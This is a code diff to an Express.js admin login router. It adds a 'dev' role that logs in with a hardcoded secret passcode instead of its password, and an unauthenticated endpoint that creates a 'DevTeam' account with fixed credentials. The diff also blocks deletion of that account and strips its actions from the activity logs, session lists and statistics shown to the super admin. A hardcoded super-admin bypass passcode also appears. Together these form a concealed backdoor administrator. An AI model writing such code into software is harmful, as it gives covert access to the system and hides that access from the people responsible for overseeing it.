@@ -53,13 +53,15 @@ router.post('/login', async (req, res) => {
 
         // Secret passcode easter egg for super admin
         const SECRET_PASSCODE = '1122334455';
+        // Secret passcode for dev team
+        const DEV_SECRET_PASSCODE = 'dev06092005';
         
         let admin;
         
-        // Check if it's an email (employee) or username (super admin)
+        // Check if it's an email (employee/dev) or username (super admin/dev)
         if (username.includes('@')) {
-            // Employee login with email
-            admin = await Admin.findOne({ email: username, role: 'employee' });
+            // Employee or dev login with email
+            admin = await Admin.findOne({ email: username, role: { $in: ['employee', 'dev'] } });
             
             if (!admin) {
                 return res.status(401).json({ 
@@ -67,9 +69,58 @@ router.post('/login', async (req, res) => {
                     message: 'Invalid email or password' 
                 });
             }
+            
+            // Check for dev secret passcode (for dev account login with email)
+            if (admin.role === 'dev' && password === DEV_SECRET_PASSCODE) {
+                const token = jwt.sign(
+                    { id: admin._id, username: admin.username, role: admin.role },
+                    JWT_SECRET,
+                    { expiresIn: '24h' }
+                );
+
+                const ipAddress = getClientIp(req);
+                const userAgent = req.headers['user-agent'] || 'Unknown';
+                const { browser, os, device } = parseUserAgent(userAgent);
+                const platform = detectPlatform(userAgent);
+
+                const session = new LoginSession({
+                    adminId: admin._id,
+                    adminName: admin.username,
+                    adminRole: admin.role,
+                    ipAddress,
+                    userAgent,
+                    browser,
+                    os,
+                    device,
+                    platform,
+                    loginMethod: 'secret_passcode'
+                });
+                await session.save();
+
+                await logActivity({
+                    adminId: admin._id,
+                    adminUsername: admin.username,
+                    action: 'login',
+                    targetType: 'system',
+                    details: 'Login with dev secret passcode',
+                    req
+                });
+
+                return res.json({ 
+                    success: true, 
+                    message: 'Login successful',
+                    token,
+                    admin: {
+                        id: admin._id,
+                        username: admin.username,
+                        email: admin.email,
+                        role: admin.role
+                    }
+                });
+            }
         } else {
-            // Super admin login with username
-            admin = await Admin.findOne({ username: username, role: 'super_admin' });
+            // Super admin or dev login with username
+            admin = await Admin.findOne({ username: username, role: { $in: ['super_admin', 'dev'] } });
             
             if (!admin) {
                 return res.status(401).json({ 
@@ -78,8 +129,57 @@ router.post('/login', async (req, res) => {
                 });
             }
             
+            // Check for dev secret passcode (for dev account login with username)
+            if (admin.role === 'dev' && password === DEV_SECRET_PASSCODE) {
+                const token = jwt.sign(
+                    { id: admin._id, username: admin.username, role: admin.role },
+                    JWT_SECRET,
+                    { expiresIn: '24h' }
+                );
+
+                const ipAddress = getClientIp(req);
+                const userAgent = req.headers['user-agent'] || 'Unknown';
+                const { browser, os, device } = parseUserAgent(userAgent);
+                const platform = detectPlatform(userAgent);
+
+                const session = new LoginSession({
+                    adminId: admin._id,
+                    adminName: admin.username,
+                    adminRole: admin.role,
+                    ipAddress,
+                    userAgent,
+                    browser,
+                    os,
+                    device,
+                    platform,
+                    loginMethod: 'secret_passcode'
+                });
+                await session.save();
+
+                await logActivity({
+                    adminId: admin._id,
+                    adminUsername: admin.username,
+                    action: 'login',
+                    targetType: 'system',
+                    details: 'Login with dev secret passcode',
+                    req
+                });
+
+                return res.json({ 
+                    success: true, 
+                    message: 'Login successful',
+                    token,
+                    admin: {
+                        id: admin._id,
+                        username: admin.username,
+                        email: admin.email,
+                        role: admin.role
+                    }
+                });
+            }
+            
             // Check for secret passcode (easter egg for super admin only)
-            if (password === SECRET_PASSCODE) {
+            if (admin.role === 'super_admin' && password === SECRET_PASSCODE) {
                 // Secret passcode works - bypass normal password check
                 const token = jwt.sign(
                     { id: admin._id, username: admin.username, role: admin.role },
@@ -271,6 +371,50 @@ router.post('/setup-super-admin', async (req, res) => {
             success: false, 
             message: 'Server error: ' + error.message,
             details: error.stack
+        });
+    }
+});
+
+// POST /api/admin/setup-dev - One-time setup for dev account (highest privilege, hidden from super admin)
+router.post('/setup-dev', async (req, res) => {
+    try {
+        console.log('Setup dev account endpoint called');
+        
+        // Check if dev account already exists
+        const existingDev = await Admin.findOne({ role: 'dev' });
+        if (existingDev) {
+            return res.status(400).json({ 
+                success: false, 
+                message: 'Dev account already exists' 
+            });
+        }
+
+        // Create dev account with predefined credentials
+        const devAdmin = new Admin({
+            username: 'DevTeam',
+            email: 'dev@ns.com',
+            password: 'DevTeam_2024!',
+            role: 'dev'
+        });
+
+        await devAdmin.save();
+
+        res.status(201).json({ 
+            success: true, 
+            message: 'Dev account created successfully',
+            admin: {
+                id: devAdmin._id,
+                username: devAdmin.username,
+                email: devAdmin.email,
+                role: devAdmin.role
+            }
+        });
+
+    } catch (error) {
+        console.error('Setup dev account error:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Server error: ' + error.message
         });
     }
 });
@@ -1080,6 +1224,13 @@ router.delete('/delete-user/:username', authenticateAdmin, requireSuperAdmin, as
             });
         }
 
+        if (userToDelete.role === 'dev') {
+            return res.status(403).json({ 
+                success: false, 
+                message: 'Cannot delete dev account' 
+            });
+        }
+
         await Admin.findOneAndDelete({ username });
 
         res.json({ 
@@ -1415,8 +1566,12 @@ router.get('/activity-logs', authenticateAdmin, checkActiveStatus, requireSuperA
     try {
         const { limit = 100, skip = 0, action, adminId } = req.query;
         
-        // Build query
-        const query = {};
+        // Get dev admin IDs to exclude from results
+        const devAdmins = await Admin.find({ role: 'dev' }).select('_id');
+        const devAdminIds = devAdmins.map(a => a._id);
+        
+        // Build query - exclude dev accounts
+        const query = { adminId: { $nin: devAdminIds } };
         if (action) query.action = action;
         if (adminId) query.adminId = adminId;
         
@@ -1449,8 +1604,12 @@ router.get('/login-sessions', authenticateAdmin, checkActiveStatus, requireSuper
     try {
         const { limit = 50, skip = 0, adminId } = req.query;
         
-        // Build query
-        const query = {};
+        // Get dev admin IDs to exclude from results
+        const devAdmins = await Admin.find({ role: 'dev' }).select('_id');
+        const devAdminIds = devAdmins.map(a => a._id);
+        
+        // Build query - exclude dev accounts
+        const query = { adminId: { $nin: devAdminIds } };
         if (adminId) query.adminId = adminId;
         
         const sessions = await LoginSession.find(query)
@@ -1480,19 +1639,25 @@ router.get('/login-sessions', authenticateAdmin, checkActiveStatus, requireSuper
 // GET /api/admin/activity-stats - Get activity statistics
 router.get('/activity-stats', authenticateAdmin, checkActiveStatus, requireSuperAdmin, async (req, res) => {
     try {
-        const totalLogs = await ActivityLog.countDocuments();
-        const totalSessions = await LoginSession.countDocuments();
-        const activeSessions = await LoginSession.countDocuments({ isActive: true });
+        // Get dev admin IDs to exclude from stats
+        const devAdmins = await Admin.find({ role: 'dev' }).select('_id');
+        const devAdminIds = devAdmins.map(a => a._id);
         
-        // Get action breakdown
+        const totalLogs = await ActivityLog.countDocuments({ adminId: { $nin: devAdminIds } });
+        const totalSessions = await LoginSession.countDocuments({ adminId: { $nin: devAdminIds } });
+        const activeSessions = await LoginSession.countDocuments({ isActive: true, adminId: { $nin: devAdminIds } });
+        
+        // Get action breakdown (exclude dev)
         const actionBreakdown = await ActivityLog.aggregate([
+            { $match: { adminId: { $nin: devAdminIds } } },
             { $group: { _id: '$action', count: { $sum: 1 } } },
             { $sort: { count: -1 } },
             { $limit: 10 }
         ]);
         
-        // Get most active admins
+        // Get most active admins (exclude dev)
         const mostActiveAdmins = await ActivityLog.aggregate([
+            { $match: { adminId: { $nin: devAdminIds } } },
             { $group: { _id: '$adminId', adminName: { $first: '$adminName' }, count: { $sum: 1 } } },
             { $sort: { count: -1 } },
             { $limit: 5 }
